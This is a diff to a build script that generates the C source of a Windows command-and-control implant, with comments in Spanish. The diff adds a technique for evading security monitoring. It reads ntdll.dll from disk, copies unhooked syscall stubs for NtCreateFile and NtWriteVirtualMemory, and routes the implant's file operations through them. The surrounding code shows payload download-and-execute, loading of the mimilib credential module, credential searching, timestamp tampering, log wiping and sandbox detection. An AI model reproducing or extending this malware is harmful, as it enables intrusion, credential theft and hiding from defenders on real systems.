@@ -177,7 +177,7 @@ chmod +x build.sh && ./build.sh
 cat > Makefile << EOF
 .PHONY: windows clean upx
 windows: beacon.c
-	x86_64-w64-mingw32-gcc beacon.c aes.c cJSON.c COFFLoader.o -o $OUTPUT -lwinhttp -lcrypt32 -lws2_32 -liphlpapi -lbcrypt -lshlwapi -lrpcrt4 -lole32 -loleaut32 -luser32 -DUNICODE -D_UNICODE -D_CRT_SECURE_NO_WARNINGS  
+	x86_64-w64-mingw32-gcc beacon.c aes.c cJSON.c COFFLoader.o -o $OUTPUT -lwinhttp -lcrypt32 -lws2_32 -liphlpapi -lbcrypt -lshlwapi -lrpcrt4 -lole32 -loleaut32 -luser32 -lntdll -DUNICODE -D_UNICODE -D_CRT_SECURE_NO_WARNINGS  
 clean:
 	#rm -f $OUTPUT beacon.c
 upx:
@@ -215,6 +215,73 @@ cat > beacon.c << EOF
 #include "cJSON.h"
 #include "beacon.h"
 #include "COFFLoader.h"
+
+// =================================================================================================
+// NTAPI TYPE DEFINITIONS (required for NtCreateFile)
+// =================================================================================================
+#ifndef _NTDEF_
+typedef LONG NTSTATUS;
+typedef NTSTATUS *PNTSTATUS;
+#endif
+
+#ifndef _NTSTATUS_DEFINED
+#define _NTSTATUS_DEFINED
+typedef LONG NTSTATUS;
+#endif
+
+#ifndef NT_SUCCESS
+#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
+#endif
+
+typedef struct _UNICODE_STRING {
+    USHORT Length;
+    USHORT MaximumLength;
+    PWSTR Buffer;
+} UNICODE_STRING, *PUNICODE_STRING;
+
+typedef struct _OBJECT_ATTRIBUTES {
+    ULONG Length;
+    HANDLE RootDirectory;
+    PUNICODE_STRING ObjectName;
+    ULONG Attributes;
+    PVOID SecurityDescriptor;
+    PVOID SecurityQualityOfService;
+} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;
+
+typedef struct _IO_STATUS_BLOCK {
+    union {
+        NTSTATUS Status;
+        PVOID Pointer;
+    };
+    ULONG_PTR Information;
+} IO_STATUS_BLOCK, *PIO_STATUS_BLOCK;
+
+#define OBJ_CASE_INSENSITIVE 0x00000040L
+#ifndef FILE_SYNCHRONOUS_IO_NONALERT
+#define FILE_SYNCHRONOUS_IO_NONALERT 0x20
+#endif
+#define FILE_NON_DIRECTORY_FILE 0x00000040
+#define FILE_DIRECTORY_FILE 0x00000001
+
+
+// Declaraciones manuales de funciones NTAPI
+NTSYSAPI VOID NTAPI RtlInitUnicodeString(
+    PUNICODE_STRING DestinationString,
+    PCWSTR SourceString
+);
+
+
+
+// Convierte UTF-8 a wide string
+WCHAR* UTF8ToWide(const char* utf8) {
+    int len = MultiByteToWideChar(CP_UTF8, 0, utf8, -1, NULL, 0);
+    WCHAR* wide = (WCHAR*)malloc(len * sizeof(WCHAR));
+    if (wide) {
+        MultiByteToWideChar(CP_UTF8, 0, utf8, -1, wide, len);
+    }
+    return wide;
+}
+
 
 #pragma warning(disable: 4005)
 #pragma comment(lib, "secur32.lib")
@@ -395,7 +462,231 @@ const char* aes_key_hex = "$AES_KEY";
 
 BYTE aes_key[32];
 
+// =================================================================================================
+// UNHOOKED SYSCALL STUBS
+// =================================================================================================
+#define SYSCALL_STUB_SIZE 23
 
+typedef NTSTATUS(NTAPI* myNtCreateFile)(
+    PHANDLE FileHandle,
+    ACCESS_MASK DesiredAccess,
+    POBJECT_ATTRIBUTES ObjectAttributes,
+    PIO_STATUS_BLOCK IoStatusBlock,
+    PLARGE_INTEGER AllocationSize,
+    ULONG FileAttributes,
+    ULONG ShareAccess,
+    ULONG CreateDisposition,
+    ULONG CreateOptions,
+    PVOID EaBuffer,
+    ULONG EaLength
+);
+
+typedef NTSTATUS(NTAPI* myNtWriteVirtualMemory)(
+    HANDLE ProcessHandle,
+    PVOID BaseAddress,
+    PVOID Buffer,
+    SIZE_T BufferSize,
+    PSIZE_T NumberOfBytesWritten
+);
+
+// Stubs globales
+myNtCreateFile g_pNtCreateFileUnhooked = NULL;
+myNtWriteVirtualMemory g_pNtWriteVirtualMemoryUnhooked = NULL;
+
+// Convierte RVA a offset en archivo
+PVOID RVAtoRawOffset(DWORD_PTR RVA, PIMAGE_SECTION_HEADER section)
+{
+    return (PVOID)(RVA - section->VirtualAddress + section->PointerToRawData);
+}
+
+// Encuentra y copia el stub de la syscall
+BOOL GetSyscallStub(
+    LPCSTR functionName,
+    PIMAGE_EXPORT_DIRECTORY exportDirectory,
+    LPVOID fileData,
+    PIMAGE_SECTION_HEADER textSection,
+    PIMAGE_SECTION_HEADER rdataSection,
+    LPVOID syscallStub
+) {
+    PDWORD addressOfNames = (PDWORD)RVAtoRawOffset(
+        (DWORD_PTR)fileData + exportDirectory->AddressOfNames, rdataSection);
+
+    PDWORD addressOfFunctions = (PDWORD)RVAtoRawOffset(
+        (DWORD_PTR)fileData + exportDirectory->AddressOfFunctions, rdataSection);
+
+    PWORD  addressOfNameOrdinals = (PWORD)RVAtoRawOffset(
+        (DWORD_PTR)fileData + exportDirectory->AddressOfNameOrdinals, rdataSection);
+
+    for (DWORD i = 0; i < exportDirectory->NumberOfNames; i++)
+    {
+        DWORD_PTR nameRVA = addressOfNames[i];
+        char* name = (char*)RVAtoRawOffset((DWORD_PTR)fileData + nameRVA, rdataSection);
+
+        if (strcmp(name, functionName) == 0)
+        {
+            WORD ordinal = addressOfNameOrdinals[i];
+            DWORD functionRVA = addressOfFunctions[ordinal];
+            BYTE* functionBytes = (BYTE*)RVAtoRawOffset((DWORD_PTR)fileData + functionRVA, textSection);
+            memcpy(syscallStub, functionBytes, SYSCALL_STUB_SIZE);
+            return TRUE;
+        }
+    }
+    return FALSE;
+}
+
+// Inicializa los stubs unhooked desde disco
+BOOL InitializeUnhookedSyscalls()
+{
+    // Reservar memoria para stubs
+    char* stubCreateFile = VirtualAlloc(NULL, SYSCALL_STUB_SIZE, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    char* stubWriteMem = VirtualAlloc(NULL, SYSCALL_STUB_SIZE, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (!stubCreateFile || !stubWriteMem) {
+        if (stubCreateFile) VirtualFree(stubCreateFile, 0, MEM_RELEASE);
+        if (stubWriteMem) VirtualFree(stubWriteMem, 0, MEM_RELEASE);
+        return FALSE;
+    }
+
+    // Abrir y leer ntdll.dll desde disco
+    HANDLE hFile = CreateFileA("C:\\\\Windows\\\\System32\\\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
+    if (hFile == INVALID_HANDLE_VALUE) {
+        VirtualFree(stubCreateFile, 0, MEM_RELEASE);
+        VirtualFree(stubWriteMem, 0, MEM_RELEASE);
+        return FALSE;
+    }
+
+    DWORD fileSize = GetFileSize(hFile, NULL);
+    LPVOID fileData = VirtualAlloc(NULL, fileSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (!fileData) {
+        CloseHandle(hFile);
+        VirtualFree(stubCreateFile, 0, MEM_RELEASE);
+        VirtualFree(stubWriteMem, 0, MEM_RELEASE);
+        return FALSE;
+    }
+
+    DWORD bytesRead;
+    if (!ReadFile(hFile, fileData, fileSize, &bytesRead, NULL)) {
+        CloseHandle(hFile);
+        VirtualFree(fileData, 0, MEM_RELEASE);
+        VirtualFree(stubCreateFile, 0, MEM_RELEASE);
+        VirtualFree(stubWriteMem, 0, MEM_RELEASE);
+        return FALSE;
+    }
+    CloseHandle(hFile);
+
+    // Parsear headers
+    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)fileData;
+    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)fileData + dosHeader->e_lfanew);
+
+    // Encontrar secciones .text y .rdata
+    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
+    PIMAGE_SECTION_HEADER textSection = NULL;
+    PIMAGE_SECTION_HEADER rdataSection = NULL;
+
+    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++, section++)
+    {
+        if (strcmp((char*)section->Name, ".text") == 0)
+            textSection = section;
+        else if (strcmp((char*)section->Name, ".rdata") == 0)
+            rdataSection = section;
+    }
+
+    if (!textSection || !rdataSection) {
+        VirtualFree(fileData, 0, MEM_RELEASE);
+        VirtualFree(stubCreateFile, 0, MEM_RELEASE);
+        VirtualFree(stubWriteMem, 0, MEM_RELEASE);
+        return FALSE;
+    }
+
+    // Obtener export table
+    DWORD exportRVA = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
+    PIMAGE_EXPORT_DIRECTORY exportDir = (PIMAGE_EXPORT_DIRECTORY)RVAtoRawOffset(
+        (DWORD_PTR)fileData + exportRVA, rdataSection);
+
+    // Extraer stub de NtCreateFile
+    if (!GetSyscallStub("NtCreateFile", exportDir, fileData, textSection, rdataSection, stubCreateFile)) {
+        VirtualFree(fileData, 0, MEM_RELEASE);
+        VirtualFree(stubCreateFile, 0, MEM_RELEASE);
+        VirtualFree(stubWriteMem, 0, MEM_RELEASE);
+        return FALSE;
+    }
+
+    // Extraer stub de NtWriteVirtualMemory
+    if (!GetSyscallStub("NtWriteVirtualMemory", exportDir, fileData, textSection, rdataSection, stubWriteMem)) {
+        VirtualFree(fileData, 0, MEM_RELEASE);
+        VirtualFree(stubCreateFile, 0, MEM_RELEASE);
+        VirtualFree(stubWriteMem, 0, MEM_RELEASE);
+        return FALSE;
+    }
+
+    VirtualFree(fileData, 0, MEM_RELEASE);
+
+    // Hacer ejecutables los stubs
+    DWORD oldProtect;
+    if (!VirtualProtect(stubCreateFile, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtect) ||
+        !VirtualProtect(stubWriteMem, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtect)) {
+        VirtualFree(stubCreateFile, 0, MEM_RELEASE);
+        VirtualFree(stubWriteMem, 0, MEM_RELEASE);
+        return FALSE;
+    }
+
+    // Asignar a variables globales
+    g_pNtCreateFileUnhooked = (myNtCreateFile)stubCreateFile;
+    g_pNtWriteVirtualMemoryUnhooked = (myNtWriteVirtualMemory)(LPVOID)stubWriteMem;
+
+    return TRUE;
+}
+// Wrapper para reemplazar CreateFileA con NtCreateFile unhooked
+HANDLE CreateFileA_Unhooked(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile)
+{
+    if (!g_pNtCreateFileUnhooked) {
+        // Fallback a CreateFileA si el stub no está disponible
+        return CreateFileA(lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes, dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile);
+    }
+
+    UNICODE_STRING fileName;
+    RtlInitUnicodeString(&fileName, UTF8ToWide(lpFileName));
+
+    OBJECT_ATTRIBUTES oa;
+    // InitializeObjectAttributes(&oa, &fileName, OBJ_CASE_INSENSITIVE, NULL, NULL);
+    oa.Length = sizeof(OBJECT_ATTRIBUTES);
+    oa.RootDirectory = NULL;
+    oa.Attributes = OBJ_CASE_INSENSITIVE;
+    oa.ObjectName = &fileName;
+    oa.SecurityDescriptor = NULL;
+    oa.SecurityQualityOfService = NULL;
+
+    IO_STATUS_BLOCK iosb = {0};
+    HANDLE hFile = NULL;
+
+    ULONG createOptions = 0;
+    if (dwFlagsAndAttributes & FILE_ATTRIBUTE_DIRECTORY) {
+        createOptions |= FILE_DIRECTORY_FILE;
+    }
+    if (!(dwFlagsAndAttributes & FILE_FLAG_OVERLAPPED)) {
+        createOptions |= FILE_SYNCHRONOUS_IO_NONALERT;
+    }
+
+    NTSTATUS status = g_pNtCreateFileUnhooked(
+        &hFile,
+        dwDesiredAccess,
+        &oa,
+        &iosb,
+        NULL,
+        dwFlagsAndAttributes & 0xFFFF, // FileAttributes
+        dwShareMode,
+        dwCreationDisposition,
+        createOptions,
+        NULL,
+        0
+    );
+
+    if (!NT_SUCCESS(status)) {
+        SetLastError(0); // o mapear el NTSTATUS a un código de error Win32 si lo deseas
+        return INVALID_HANDLE_VALUE;
+    }
+
+    return hFile;
+}
 // User-Agents (como en tu Go)
 const char* USER_AGENTS[] = {
     "$USER_AGENT",
@@ -434,11 +725,7 @@ static LONG WINAPI ExceptionFilter(EXCEPTION_POINTERS *ExceptionInfo) {
 }
 
 // === ESTRUCTURAS NECESARIAS (MinGW-safe) ===
-typedef struct _UNICODE_STRING {
-    USHORT Length;
-    USHORT MaximumLength;
-    PWSTR  Buffer;
-} UNICODE_STRING, *PUNICODE_STRING;
+
 
 typedef struct _LDR_DATA_TABLE_ENTRY {
     LIST_ENTRY InMemoryOrderLinks;
@@ -570,7 +857,6 @@ void simulateLegitimateTraffic();
 void PortScanner(char* targetIP, int* ports, int numPorts);
 char* encrypt_data(const char* data);
 char* base64_encode(const unsigned char* data, size_t inputLen);
-wchar_t* UTF8ToWide(const char* utf8);
 void scanPort(void* arg);
 BOOL isValidUUID(const char* uuid);
 unsigned char* DownloadToBuffer(const char* url, DWORD* fileSize);
@@ -962,7 +1248,7 @@ BOOL LoadModuleFromURL(const char* url) {
             return FALSE;
         }
 
-        HANDLE hFile = CreateFileA(tempPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+        HANDLE hFile = CreateFileA_Unhooked(tempPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
         if (hFile == INVALID_HANDLE_VALUE) {
             printf("[-] No se pudo crear archivo temporal\n");
             free(dllBuffer);
@@ -1036,7 +1322,7 @@ BOOL LoadModuleFromURL(const char* url) {
         fflush(stdout);
 
         // --- 9. Verificar activación ---
-        HANDLE hLog = CreateFileA("C:\\\\Windows\\\\System32\\\\mimilsa.log", GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
+        HANDLE hLog = CreateFileA_Unhooked("C:\\\\Windows\\\\System32\\\\mimilsa.log", GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
         if (hLog != INVALID_HANDLE_VALUE) {
             printf("[+] Éxito: mimilsa.log creado → mimilib activado\n");
             CloseHandle(hLog);
@@ -2722,22 +3008,14 @@ char* searchCredentials(const char* basePath) {
     return results;
 }
 
-// Convierte UTF-8 a wide string
-WCHAR* UTF8ToWide(const char* utf8) {
-    int len = MultiByteToWideChar(CP_UTF8, 0, utf8, -1, NULL, 0);
-    WCHAR* wide = (WCHAR*)malloc(len * sizeof(WCHAR));
-    if (wide) {
-        MultiByteToWideChar(CP_UTF8, 0, utf8, -1, wide, len);
-    }
-    return wide;
-}
+
 
 
 // Ofusca los timestamps de un archivo
 BOOL obfuscateFileTimestamp(const char* filepath) {
     printf("[*] ofuscateFileTimestamp...\n");
     fflush(stdout);
-    HANDLE hFile = CreateFileA(filepath,
+    HANDLE hFile = CreateFileA_Unhooked(filepath,
         FILE_WRITE_ATTRIBUTES,
         0,
         NULL,
@@ -2798,7 +3076,7 @@ void obfuscateFileTimestamps(const char* basePath, int depth) {
             obfuscateFileTimestamps(filepath, depth + 1);  // Incrementar profundidad
         } else {
             if (isSensitiveFile(ffd.cFileName)) {
-                HANDLE hFile = CreateFileA(filepath,
+                HANDLE hFile = CreateFileA_Unhooked(filepath,
                     FILE_WRITE_ATTRIBUTES,
                     FILE_SHARE_READ | FILE_SHARE_WRITE,
                     NULL,
@@ -3056,7 +3334,7 @@ BOOL downloadAndExecute(const char* url, const char* targetProcess) {
 
     printf("[*] Saving downloaded payload to: %s\n", filename);
 
-    HANDLE hFile = CreateFileA(filename, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    HANDLE hFile = CreateFileA_Unhooked(filename, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
     if (hFile == INVALID_HANDLE_VALUE) {
         printf("[-] Cannot create file: %s (Error: %lu)\n", filename, GetLastError());
         free(payload);
@@ -3478,7 +3756,7 @@ void overWrite(const char* targetPath, const char* payloadPath) {
         }
     }
     // === 1. Cargar payload ===
-    HANDLE hFile = CreateFileA(payloadPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
+    HANDLE hFile = CreateFileA_Unhooked(payloadPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
     if (hFile == INVALID_HANDLE_VALUE) {
         printf("[-] Cannot open payload: %s\n", payloadPath);
         return;
@@ -3567,7 +3845,7 @@ void cleanSystemLogs() {
     system("del /f /q %TEMP%\\\*.tmp 2>nul");
 
     // 4. Limpiar el historial de comandos de la consola (cmd.exe)
-    HANDLE hConOut = CreateFileA("CONOUT$", GENERIC_WRITE, FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
+    HANDLE hConOut = CreateFileA_Unhooked("CONOUT$", GENERIC_WRITE, FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
     if (hConOut != INVALID_HANDLE_VALUE) {
         DWORD written;
         WriteConsoleA(hConOut, "\x1b[2J\x1b[H", 7, &written, NULL); // ANSI clear screen
@@ -3701,7 +3979,7 @@ BOOL isSandboxEnvironment() {
 
     // 4. Dispositivos de disco virtual
     if (GetDriveTypeA("C:\\\\") == DRIVE_FIXED) {
-        HANDLE h = CreateFileA("\\\\\\\\.\\\\PhysicalDrive0", 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
+        HANDLE h = CreateFileA_Unhooked("\\\\\\\\.\\\\PhysicalDrive0", 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
         if (h != INVALID_HANDLE_VALUE) {
             STORAGE_PROPERTY_QUERY query = { StorageDeviceProperty };
             STORAGE_DEVICE_DESCRIPTOR descriptor;
